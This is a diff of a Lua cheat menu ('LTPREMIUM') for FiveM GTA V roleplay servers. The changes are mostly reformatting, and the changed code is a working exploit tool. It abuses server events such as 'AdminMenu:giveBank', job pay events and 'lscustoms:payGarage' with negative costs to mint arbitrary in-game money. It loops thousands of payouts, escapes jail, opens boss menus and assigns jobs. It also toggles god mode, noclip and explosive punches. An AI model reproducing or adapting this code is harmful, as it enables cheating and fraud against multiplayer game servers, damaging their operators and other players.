-				elseif LTPREMIUM.Button("~y~Banker~w~ Boss Menu") then
-					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
-					setMenuVisible(currentMenu, false)
-				elseif LTPREMIUM.Button("~c~Mafia~w~ Boss Menu") then
-					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
-					setMenuVisible(currentMenu, false)
-				elseif LTPREMIUM.Button("~g~ESX ~y~Custom Boss Menu") then
-					local result = KeyboardInput("Enter Boss Menu Script Name", "", 10)
-					if result then
-						TriggerEvent('esx_society:openBossMenu', result, function(data,menu) menu.close() end)
-					setMenuVisible(currentMenu, false)
-					end
-				end
+                    TriggerEvent('esx_society:openBossMenu', 'mecano', function(data, menu) menu.close() end)
+                    setMenuVisible(currentMenu, false)
+                elseif LTPREMIUM.Button("~b~Police~w~ Boss Menu") then
+                    TriggerEvent('esx_society:openBossMenu', 'police', function(data, menu) menu.close() end)
+                    setMenuVisible(currentMenu, false)
+                elseif LTPREMIUM.Button("~r~Ambulance~w~ Boss Menu") then
+                    TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data, menu) menu.close() end)
+                    setMenuVisible(currentMenu, false)
+                elseif LTPREMIUM.Button("~y~Taxi~w~ Boss Menu") then
+                    TriggerEvent('esx_society:openBossMenu', 'taxi', function(data, menu) menu.close() end)
+                    setMenuVisible(currentMenu, false)
+                elseif LTPREMIUM.Button("~g~Real Estate~w~ Boss Menu") then
+                    TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data, menu) menu.close() end)
+                    setMenuVisible(currentMenu, false)
+                elseif LTPREMIUM.Button("~p~Gang~w~ Boss Menu") then
+                    TriggerEvent('esx_society:openBossMenu', 'gang', function(data, menu) menu.close() end)
+                    setMenuVisible(currentMenu, false)
+                elseif LTPREMIUM.Button("~o~Car Dealer~w~ Boss Menu") then
+                    TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data, menu) menu.close() end)
+                    setMenuVisible(currentMenu, false)
+                elseif LTPREMIUM.Button("~y~Banker~w~ Boss Menu") then
+                    TriggerEvent('esx_society:openBossMenu', 'banker', function(data, menu) menu.close() end)
+                    setMenuVisible(currentMenu, false)
+                elseif LTPREMIUM.Button("~c~Mafia~w~ Boss Menu") then
+                    TriggerEvent('esx_society:openBossMenu', 'mafia', function(data, menu) menu.close() end)
+                    setMenuVisible(currentMenu, false)
+                elseif LTPREMIUM.Button("~g~ESX ~y~Custom Boss Menu") then
+                    local result = KeyboardInput("Enter Boss Menu Script Name", "", 10)
+                    if result then
+                        TriggerEvent('esx_society:openBossMenu', result, function(data, menu) menu.close() end)
+                        setMenuVisible(currentMenu, false)
+                    end
+                end
 
                 LTPREMIUM.Display()
             elseif LTPREMIUM.IsMenuOpened("ESXJobMenu") then
                 if LTPREMIUM.Button("Unemployed") then
-                    TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(-1))
+                    TriggerServerEvent("NB:destituerplayer", GetPlayerServerId(-1))
                 elseif LTPREMIUM.Button("Police") then
-                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"police",3)
+                    TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(-1), "police", 3)
                 elseif LTPREMIUM.Button("Mechanic") then
-                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"mecano",3)
+                    TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(-1), "mecano", 3)
                 elseif LTPREMIUM.Button("Taxi") then
-                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"taxi",3)
+                    TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(-1), "taxi", 3)
                 elseif LTPREMIUM.Button("Ambulance") then
-                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"ambulance",3)
+                    TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(-1), "ambulance", 3)
                 elseif LTPREMIUM.Button("Real Estate Agent") then
-                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"realestateagent",3)
+                    TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(-1), "realestateagent", 3)
                 elseif LTPREMIUM.Button("Car Dealer") then
-                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"cardealer",3)
+                    TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(-1), "cardealer", 3)
                 end
 
                 LTPREMIUM.Display()
-                        elseif LTPREMIUM.IsMenuOpened("ESXMoneyMenu") then
+            elseif LTPREMIUM.IsMenuOpened("ESXMoneyMenu") then
                 if LTPREMIUM.Button("-» Ultimate moneymaker «-") then
-				local result = KeyboardInput("Enter amount of money", "", 100000000)
-				if result then
-				TriggerServerEvent('esx_truckerjob:pay', result)
-				TriggerServerEvent('vrp_slotmachine:server:2', result)
-				TriggerServerEvent("esx_pizza:pay", result)
-				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
-				TriggerServerEvent('lscustoms:payGarage', result)
-				TriggerServerEvent('esx_tankerjob:pay', result)
-				TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
-				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
-				TriggerServerEvent('gambling:spend', result)
-				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
-				TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
-				TriggerServerEvent('AdminMenu:giveBank', result)
-				TriggerServerEvent('AdminMenu:giveCash', result)
-				TriggerServerEvent('esx_slotmachine:sv:2', result)
-				TriggerServerEvent('esx_truckerjob:pay', result)
-				TriggerServerEvent('esx_moneywash:deposit', result)
-				TriggerServerEvent('esx_moneywash:withdraw', result)
-				TriggerServerEvent('esx_moneywash:deposit', result)
-			    TriggerServerEvent('mission:completed', result)
-				TriggerServerEvent('truckerJob:success',result)-- 4x482
-				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
-				TriggerServerEvent('99kr-burglary:addMoney', result)
-				end
-			elseif LTPREMIUM.Button("~g~Caution give back $") then
-				local result = KeyboardInput("Enter amount of money", "", 100000000)
-				if result then
-				TriggerServerEvent("esx_jobs:caution", "give_back", result)
-				end
-			elseif LTPREMIUM.Button("~g~Truckerjob $") then
-				local result = KeyboardInput("Enter amount of money", "", 100000000)
-				if result then
-				TriggerServerEvent('esx_truckerjob:pay', result)
-				end
-			elseif LTPREMIUM.Button("~g~Admin give bank $") then
-				local result = KeyboardInput("Enter amount of money", "", 100000000)
-				if result then
-				TriggerServerEvent('AdminMenu:giveBank', result)
-				end
-			elseif LTPREMIUM.Button("~g~Admin give cash $") then
-				local result = KeyboardInput("Enter amount of money", "", 100000000)
-				if result then
-				TriggerServerEvent('AdminMenu:giveCash', result)
-				end
-			elseif LTPREMIUM.Button("~g~Postal job $") then
-				local result = KeyboardInput("Enter amount of money", "", 100000000)
-				if result then
-					TriggerServerEvent("esx_gopostaljob:pay", result)
-				end
-			elseif LTPREMIUM.Button("~g~Bank security $") then
-				local result = KeyboardInput("Enter amount of money", "", 100000000)
-				if result then
-					TriggerServerEvent("esx_banksecurity:pay", result)
-				end
-			elseif LTPREMIUM.Button("~g~Slotmachine $") then
-				local result = KeyboardInput("Enter amount of money", "", 100000000)
-				if result then
-					TriggerServerEvent("esx_slotmachine:sv:2", result)
-				end
-			elseif LTPREMIUM.Button("~g~ LScustoms $") then
-				local result = KeyboardInput("Enter amount of money", "", 100)
-				if result then
-					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
-				end		
-			elseif LTPREMIUM.Button("~g~Slotmachine(2) $") then
-				local result = KeyboardInput("Enter amount of money", "", 100)
-				if result then
-				TriggerServerEvent("vrp_slotmachine:server:2", result)
-				end
-			elseif LTPREMIUM.Button("~g~Dirty money $") then
-				local result = KeyboardInput("Enter amount of money", "", 100000000)
-				if result then
-					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
-				end
-			elseif LTPREMIUM.Button("~g~Delivery $") then
-				local result = KeyboardInput("Enter amount of money", "", 100000000)
-				if result then
-					TriggerServerEvent('delivery:success', result)
-				end
-			elseif LTPREMIUM.Button("~g~Taxijob $") then
-				local result = KeyboardInput("Enter amount of money", "", 100000000)
-				if result then
-					TriggerServerEvent ('taxi:success', result)
-				end
-			elseif LTPREMIUM.Button("~g~Taxijob 10.000x $") then
-				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
-			elseif LTPREMIUM.Button("~g~Pilot & Taxi (~g~ESX~s~) $") then
-					TriggerServerEvent('esx_pilot:success')
-					TriggerServerEvent('esx_taxijob:success')
-					TriggerServerEvent('esx_pilot:success')
-					TriggerServerEvent('esx_taxijob:success')
-					TriggerServerEvent('esx_pilot:success')
-					TriggerServerEvent('esx_taxijob:success')
-					TriggerServerEvent('esx_pilot:success')
-			elseif LTPREMIUM.Button("~g~Garbagejob $") then
-				local result = KeyboardInput("Enter amount of money", "", 100000000)
-				if result then
-					TriggerServerEvent("esx_garbagejob:pay", result)
-				end	
-			elseif LTPREMIUM.Button("~g~Paycheck $") then
-				TriggerServerEvent('paycheck:salary')
-				TriggerServerEvent('paycheck:salary')
-				TriggerServerEvent('paycheck:salary')
-				TriggerServerEvent('paycheck:salary')
-				TriggerServerEvent('paycheck:salary')
-				TriggerServerEvent('paycheck:salary')
-				TriggerServerEvent('paycheck:salary')
-				TriggerServerEvent('paycheck:salary')
-				end
+                    local result = KeyboardInput("Enter amount of money", "", 100000000)
+                    if result then
+                        TriggerServerEvent('esx_truckerjob:pay', result)
+                        TriggerServerEvent('vrp_slotmachine:server:2', result)
+                        TriggerServerEvent("esx_pizza:pay", result)
+                        TriggerServerEvent('esx_jobs:caution', 'give_back', result)
+                        TriggerServerEvent('lscustoms:payGarage', result)
+                        TriggerServerEvent('esx_tankerjob:pay', result)
+                        TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
+                        TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
+                        TriggerServerEvent('gambling:spend', result)
+                        TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
+                        TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
+                        TriggerServerEvent('AdminMenu:giveBank', result)
+                        TriggerServerEvent('AdminMenu:giveCash', result)
+                        TriggerServerEvent('esx_slotmachine:sv:2', result)
+                        TriggerServerEvent('esx_truckerjob:pay', result)
+                        TriggerServerEvent('esx_moneywash:deposit', result)
+                        TriggerServerEvent('esx_moneywash:withdraw', result)
+                        TriggerServerEvent('esx_moneywash:deposit', result)
+                        TriggerServerEvent('mission:completed', result)
+                        TriggerServerEvent('truckerJob:success', result) -- 4x482
+                        TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
+                        TriggerServerEvent('99kr-burglary:addMoney', result)
+                    end
+                elseif LTPREMIUM.Button("~g~Caution give back $") then
+                    local result = KeyboardInput("Enter amount of money", "", 100000000)
+                    if result then
+                        TriggerServerEvent("esx_jobs:caution", "give_back", result)
+                    end
+                elseif LTPREMIUM.Button("~g~Truckerjob $") then
+                    local result = KeyboardInput("Enter amount of money", "", 100000000)
+                    if result then
+                        TriggerServerEvent('esx_truckerjob:pay', result)
+                    end
+                elseif LTPREMIUM.Button("~g~Admin give bank $") then
+                    local result = KeyboardInput("Enter amount of money", "", 100000000)
+                    if result then
+                        TriggerServerEvent('AdminMenu:giveBank', result)
+                    end
+                elseif LTPREMIUM.Button("~g~Admin give cash $") then
+                    local result = KeyboardInput("Enter amount of money", "", 100000000)
+                    if result then
+                        TriggerServerEvent('AdminMenu:giveCash', result)
+                    end
+                elseif LTPREMIUM.Button("~g~Postal job $") then
+                    local result = KeyboardInput("Enter amount of money", "", 100000000)
+                    if result then
+                        TriggerServerEvent("esx_gopostaljob:pay", result)
+                    end
+                elseif LTPREMIUM.Button("~g~Bank security $") then
+                    local result = KeyboardInput("Enter amount of money", "", 100000000)
+                    if result then
+                        TriggerServerEvent("esx_banksecurity:pay", result)
+                    end
+                elseif LTPREMIUM.Button("~g~Slotmachine $") then
+                    local result = KeyboardInput("Enter amount of money", "", 100000000)
+                    if result then
+                        TriggerServerEvent("esx_slotmachine:sv:2", result)
+                    end
+                elseif LTPREMIUM.Button("~g~ LScustoms $") then
+                    local result = KeyboardInput("Enter amount of money", "", 100)
+                    if result then
+                        TriggerServerEvent("lscustoms:payGarage", { costs = -result })
+                    end
+                elseif LTPREMIUM.Button("~g~Slotmachine(2) $") then
+                    local result = KeyboardInput("Enter amount of money", "", 100)
+                    if result then
+                        TriggerServerEvent("vrp_slotmachine:server:2", result)
+                    end
+                elseif LTPREMIUM.Button("~g~Dirty money $") then
+                    local result = KeyboardInput("Enter amount of money", "", 100000000)
+                    if result then
+                        TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
+                    end
+                elseif LTPREMIUM.Button("~g~Delivery $") then
+                    local result = KeyboardInput("Enter amount of money", "", 100000000)
+                    if result then
+                        TriggerServerEvent('delivery:success', result)
+                    end
+                elseif LTPREMIUM.Button("~g~Taxijob $") then
+                    local result = KeyboardInput("Enter amount of money", "", 100000000)
+                    if result then
+                        TriggerServerEvent('taxi:success', result)
+                    end
+                elseif LTPREMIUM.Button("~g~Taxijob 10.000x $") then
+                    a = 1
+                    repeat
+                        TriggerServerEvent('esx_taxijob:success')
+                        a = a + 1
+                    until (a > 10000)
+                elseif LTPREMIUM.Button("~g~Pilot & Taxi (~g~ESX~s~) $") then
+                    TriggerServerEvent('esx_pilot:success')
+                    TriggerServerEvent('esx_taxijob:success')
+                    TriggerServerEvent('esx_pilot:success')
+                    TriggerServerEvent('esx_taxijob:success')
+                    TriggerServerEvent('esx_pilot:success')
+                    TriggerServerEvent('esx_taxijob:success')
+                    TriggerServerEvent('esx_pilot:success')
+                elseif LTPREMIUM.Button("~g~Garbagejob $") then
+                    local result = KeyboardInput("Enter amount of money", "", 100000000)
+                    if result then
+                        TriggerServerEvent("esx_garbagejob:pay", result)
+                    end
+                elseif LTPREMIUM.Button("~g~Paycheck $") then
+                    TriggerServerEvent('paycheck:salary')
+                    TriggerServerEvent('paycheck:salary')
+                    TriggerServerEvent('paycheck:salary')
+                    TriggerServerEvent('paycheck:salary')
+                    TriggerServerEvent('paycheck:salary')
+                    TriggerServerEvent('paycheck:salary')
+                    TriggerServerEvent('paycheck:salary')
+                    TriggerServerEvent('paycheck:salary')
+                end
 
                 LTPREMIUM.Display()
             elseif LTPREMIUM.IsMenuOpened("SelfMenu") then
-			if LTPREMIUM.MenuButton("~r~→  ~s~Ped Menu", "PedMenu") then
-                                elseif LTPREMIUM.Button("~g~Heal ~s~Yourself") then
+                if LTPREMIUM.MenuButton("~r~→  ~s~Ped Menu", "PedMenu") then
+                elseif LTPREMIUM.Button("~g~Heal ~s~Yourself") then
                     SetEntityHealth(PlayerPedId(), 200)
                 elseif LTPREMIUM.Button("Get Some ~b~Armor") then
                     SetPedArmour(PlayerPedId(), 200)
-				elseif LTPREMIUM.Button("Go Invisible") then
-				local model2 = GetHashKey("mp_m_niko_01")
-				local player2 = PlayerId()
-				local playerPed = GetPlayerPed(-1)
-				 RequestModel(model2)
-     while not HasModelLoaded(model2) do
-        Wait(100)
-    end
+                elseif LTPREMIUM.Button("Go Invisible") then
+                    local model2 = GetHashKey("mp_m_niko_01")
+                    local player2 = PlayerId()
+                    local playerPed = GetPlayerPed(-1)
+                    RequestModel(model2)
+                    while not HasModelLoaded(model2) do
+                        Wait(100)
+                    end
 
-    SetPlayerModel(player2, model2)
-    SetModelAsNoLongerNeeded(model2)
-					elseif LTPREMIUM.Button("Go Visible Again") then
-				local model3 = GetHashKey("mp_m_freemode_01")
-				local player3 = PlayerId()
-				local playerPed = GetPlayerPed(-1)
-				 RequestModel(model3)
-     while not HasModelLoaded(model3) do
-        Wait(100)
-    end
+                    SetPlayerModel(player2, model2)
+                    SetModelAsNoLongerNeeded(model2)
+                elseif LTPREMIUM.Button("Go Visible Again") then
+                    local model3 = GetHashKey("mp_m_freemode_01")
+                    local player3 = PlayerId()
+                    local playerPed = GetPlayerPed(-1)
+                    RequestModel(model3)
+                    while not HasModelLoaded(model3) do
+                        Wait(100)
+                    end
 
-    SetPlayerModel(player3, model3)
-		SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
-    SetModelAsNoLongerNeeded(model3)
+                    SetPlayerModel(player3, model3)
+                    SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+                    SetModelAsNoLongerNeeded(model3)
                 elseif LTPREMIUM.Button("~o~Food~s~ & ~b~Water ~s~100% (~g~ESX~s~)") then
                     TriggerEvent("esx_status:set", "hunger", 1000000)
                     TriggerEvent("esx_status:set", "thirst", 1000000)
-				elseif LTPREMIUM.Button("Get Some $ ~g~(~g~ESX~s~)") then
-				TriggerServerEvent("esx_godirtyjob:pay", 500000)
-				TriggerServerEvent("esx_pizza:pay", 500000)
-				TriggerServerEvent("esx_slotmachine:sv:2", 500000)
-				TriggerServerEvent("esx_banksecurity:pay", 500000)
-				TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
-				TriggerServerEvent('AdminMenu:giveBank', 500000)        
-				TriggerServerEvent("AdminMenu:giveCash", 500000)
-				TriggerServerEvent("esx_gopostaljob:pay", 500000)
-				TriggerServerEvent("AdminMenu:giveBank", 500000)
-				TriggerServerEvent("esx_truckerjob:pay", 500000)
-				TriggerServerEvent("esx_carthief:pay", 500000)
-			    TriggerServerEvent("esx_garbagejob:pay", 500000)
-				TriggerServerEvent("esx_ranger:pay", 500000)
-				TriggerServerEvent("esx_truckersjob:payy", 500000)
-				PlaySoundFrontend(-1, "ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET", true)
-				drawNotification("~g~KA-CHING $$")
-				elseif LTPREMIUM.Button("Get some $ ~b~(VRP)") then
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent("dropOff", 100000)
-			    TriggerServerEvent("dropOff", 100000)
-				TriggerServerEvent('PayForRepairNow',-100000)
-				TriggerServerEvent('PayForRepairNow',-100000)
-				TriggerServerEvent('PayForRepairNow',-100000)
-				TriggerServerEvent('PayForRepairNow',-100000)
-				TriggerServerEvent('PayForRepairNow',-100000)
-				TriggerServerEvent('PayForRepairNow',-100000)
-				TriggerServerEvent('PayForRepairNow',-100000)
-				TriggerServerEvent('PayForRepairNow',-100000)
-				TriggerServerEvent('PayForRepairNow',-100000)
-				TriggerServerEvent('PayForRepairNow',-100000)
-				TriggerServerEvent('PayForRepairNow',-100000)
-				TriggerServerEvent('PayForRepairNow',-100000)
-				drawNotification("~g~KA-CHING $$")
+                elseif LTPREMIUM.Button("Get Some $ ~g~(~g~ESX~s~)") then
+                    TriggerServerEvent("esx_godirtyjob:pay", 500000)
+                    TriggerServerEvent("esx_pizza:pay", 500000)
+                    TriggerServerEvent("esx_slotmachine:sv:2", 500000)
+                    TriggerServerEvent("esx_banksecurity:pay", 500000)
+                    TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
+                    TriggerServerEvent('AdminMenu:giveBank', 500000)
+                    TriggerServerEvent("AdminMenu:giveCash", 500000)
+                    TriggerServerEvent("esx_gopostaljob:pay", 500000)
+                    TriggerServerEvent("AdminMenu:giveBank", 500000)
+                    TriggerServerEvent("esx_truckerjob:pay", 500000)
+                    TriggerServerEvent("esx_carthief:pay", 500000)
+                    TriggerServerEvent("esx_garbagejob:pay", 500000)
+                    TriggerServerEvent("esx_ranger:pay", 500000)
+                    TriggerServerEvent("esx_truckersjob:payy", 500000)
+                    PlaySoundFrontend(-1, "ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET", true)
+                    drawNotification("~g~KA-CHING $$")
+                elseif LTPREMIUM.Button("Get some $ ~b~(VRP)") then
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent("dropOff", 100000)
+                    TriggerServerEvent('PayForRepairNow', -100000)
+                    TriggerServerEvent('PayForRepairNow', -100000)
+                    TriggerServerEvent('PayForRepairNow', -100000)
+                    TriggerServerEvent('PayForRepairNow', -100000)
+                    TriggerServerEvent('PayForRepairNow', -100000)
+                    TriggerServerEvent('PayForRepairNow', -100000)
+                    TriggerServerEvent('PayForRepairNow', -100000)
+                    TriggerServerEvent('PayForRepairNow', -100000)
+                    TriggerServerEvent('PayForRepairNow', -100000)
+                    TriggerServerEvent('PayForRepairNow', -100000)
+                    TriggerServerEvent('PayForRepairNow', -100000)
+                    TriggerServerEvent('PayForRepairNow', -100000)
+                    drawNotification("~g~KA-CHING $$")
                 elseif LTPREMIUM.Button("Revive yourself (~g~ESX~s~)") then
                     TriggerEvent("esx_ambulancejob:revive")
-					TriggerEvent("ambulancier:selfRespawn")
-				elseif LTPREMIUM.Button("Open Jail Menu (~g~ESX~s~)") then
-					TriggerEvent("esx-qalle-jail:openJailMenu")
+                    TriggerEvent("ambulancier:selfRespawn")
+                elseif LTPREMIUM.Button("Open Jail Menu (~g~ESX~s~)") then
+                    TriggerEvent("esx-qalle-jail:openJailMenu")
                 elseif LTPREMIUM.Button("Get Out Of Jail (~g~ESX~s~)") then
                     local ped = PlayerPedId(-1)
-                    TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
-                    TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
-                    TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
-					TriggerServerEvent("esx_jailer:unjailTime", -1)
-					TriggerServerEvent("JailUpdate", 0)
-					TriggerEvent("UnJP")
-                    TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
+                    TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(ped), 0, "escaperino")
+                    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(ped), 0)
+                    TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(ped), 0)
+                    TriggerServerEvent("esx_jailer:unjailTime", -1)
+                    TriggerServerEvent("JailUpdate", 0)
+                    TriggerEvent("UnJP")
+                    TriggerServerEvent("js:jailuser", GetPlayerServerId(ped), 0, "escaperino")
                 elseif LTPREMIUM.Button("~r~Kys") then
                     SetEntityHealth(PlayerPedId(), 0)
-                elseif  LTPREMIUM.CheckBox(
-                    "God-Mode",
-                    godmode,
-                    function(enabled)
-                    godmode = enabled
-                    end)
-                then
-				elseif LTPREMIUM.CheckBox(
-                    "~o~Nuke ~s~Punches",
-                    explosiveAmmo,
-                    function(enabled)
-                        explosiveAmmo = enabled
-                    end)
+                elseif LTPREMIUM.CheckBox(
+                        "God-Mode",
+                        godmode,
+                        function(enabled)
+                            godmode = enabled
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                    "Never Get Tired",
-                    infStamina,
-                    function(enabled)
-                    infStamina = enabled
-                    end)
+                        "~o~Nuke ~s~Punches",
+                        explosiveAmmo,
+                        function(enabled)
+                            explosiveAmmo = enabled
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                    "Fast Run",
-                    fastrun,
-                    function(enabled)
-                        fastrun = enabled
-                    end)
+                        "Never Get Tired",
+                        infStamina,
+                        function(enabled)
+                            infStamina = enabled
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                    "Super Jump",
-                    SuperJump,
-                    function(enabled)
-                        SuperJump = enabled
-                    end)
+                        "Fast Run",
+                        fastrun,
+                        function(enabled)
+                            fastrun = enabled
+                        end)
                 then
                 elseif LTPREMIUM.CheckBox(
-                    "Noclip",
-                    Noclip,
-                    function(enabled)
-                        Noclip = enabled
-                    end)
+                        "Super Jump",
+                        SuperJump,
+                        function(enabled)
+                            SuperJump = enabled
+                        end)
+                then
+                elseif LTPREMIUM.CheckBox(
+                        "Noclip",
+                        Noclip,
+                        function(enabled)
+                            Noclip = enabled
+                        end)
                 then
                 end
 
                 LTPREMIUM.Display()
-			elseif LTPREMIUM.IsMenuOpened("PedMenu") then
-				if LTPREMIUM.ComboBox("MalePed", peds2, currentPedd, selectedPedd, function(currentIndex, selectedIndex)
-                    currentPedd = currentIndex
-                    selectedPedd = selectedIndex
-                end)
+            elseif LTPREMIUM.IsMenuOpened("PedMenu") then
+                if LTPREMIUM.ComboBox("MalePed", peds2, currentPedd, selectedPedd, function(currentIndex, selectedIndex)
+                        currentPedd = currentIndex
+                        selectedPedd = selectedIndex
+                    end)
                 then
-				elseif LTPREMIUM.ComboBox("FemalePed", peds3, currentPeddd, selectedPeddd, function(currentIndex, selectedIndex)
-                    currentPeddd = currentIndex
-                    selectedPeddd = selectedIndex
-                end)
+                elseif LTPREMIUM.ComboBox("FemalePed", peds3, currentPeddd, selectedPeddd, function(currentIndex,
+                                                                                                    selectedIndex)
+                        currentPeddd = currentIndex
+                        selectedPeddd = selectedIndex
+                    end)
                 then
-				elseif LTPREMIUM.ComboBox("AnimalPed", peds4, currentPedddd, selectedPedddd, function(currentIndex, selectedIndex)
-                    currentPedddd = currentIndex
-                    selectedPedddd = selectedIndex
-                end)
+                elseif LTPREMIUM.ComboBox("AnimalPed", peds4, currentPedddd, selectedPedddd, function(currentIndex,
+                                                                                                      selectedIndex)
+                        currentPedddd = currentIndex
+                        selectedPedddd = selectedIndex
+                    end)
                 then
-			elseif LTPREMIUM.Button("Change To Selected ~b~Male") then
-					Deer.Destroy()
-		Wait(100)
-				local model1 = GetHashKey(peds2[selectedPedd])
-				local player1 = PlayerId()
-                local playerPed = GetPlayerPed(-1)
-				
-    RequestModel(model1)
-    while not HasModelLoaded(model1) do
-        Wait(100)
-    end
+                elseif LTPREMIUM.Button("Change To Selected ~b~Male") then
+                    Deer.Destroy()
+                    Wait(100)
+                    local model1 = GetHashKey(peds2[selectedPedd])
+                    local player1 = PlayerId()
+                    local playerPed = GetPlayerPed(-1)
 
-    SetPlayerModel(player1, model1)
-	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
-    SetModelAsNoLongerNeeded(model1)
-	elseif LTPREMIUM.Button("Change To Selected ~p~Female") then
-		Deer.Destroy()
-		Wait(100)
-				local model5 = GetHashKey(peds3[selectedPeddd])
-				local player5 = PlayerId()
-                local playerPed = GetPlayerPed(-1)
-				
-    RequestModel(model5)
-    while not HasModelLoaded(model5) do
-        Wait(100)
-    end
-
-    SetPlayerModel(player5, model5)
-	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
-    SetModelAsNoLongerNeeded(model5)
-	elseif LTPREMIUM.Button("Change To Selected ~y~Animal") then
-			Deer.Destroy()
-		Wait(100)
-				local model6 = GetHashKey(peds4[selectedPedddd])
-				local player6 = PlayerId()
-                local playerPed = GetPlayerPed(-1)
-				
-    RequestModel(model6)
-    while not HasModelLoaded(model6) do
-        Wait(100)
-    end
-
-    SetPlayerModel(player6, model6)
-	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
-    SetModelAsNoLongerNeeded(model6)
-		elseif LTPREMIUM.Button("Spawn A ~y~Deer ~s~And Ride It") then
-     Deer.Create()
-	Citizen.Wait(150)
-	 Deer.Ride()
-				elseif LTPREMIUM.Button("Change To FiveM Ped") then
-						Deer.Destroy()
-		Wait(100)
-				local model3 = GetHashKey("mp_m_freemode_01")
-				local player3 = PlayerId()
-				local playerPed = GetPlayerPed(-1)
-				 RequestModel(model3)
-     while not HasModelLoaded(model3) do
-        Wait(100)
-    end
-
-    SetPlayerModel(player3, model3)
